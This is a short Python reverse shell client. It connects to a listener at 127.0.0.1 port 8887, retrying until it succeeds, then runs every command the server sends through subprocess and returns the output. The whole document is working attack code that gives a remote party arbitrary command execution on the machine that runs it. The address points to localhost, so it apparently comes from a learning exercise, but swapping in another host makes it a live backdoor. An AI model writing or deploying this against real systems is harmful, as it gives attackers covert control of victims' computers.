import socket
import subprocess

targetIp = "127.0.0.1"
targetPort = 8887

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Status : Connecting...")

while True:
    try:
        soc.connect((targetIp, targetPort))
        break
    except ConnectionRefusedError:
        pass

print("Status : Connected to the server")

while True:
    receivedCommand = (soc.recv(1024)).decode()
    if (receivedCommand == "exit"):
        print("exit trigerred from server")
        break
    output = subprocess.getoutput(receivedCommand)
    soc.send(output.encode())

print("Status : Socket closed")
soc.close()
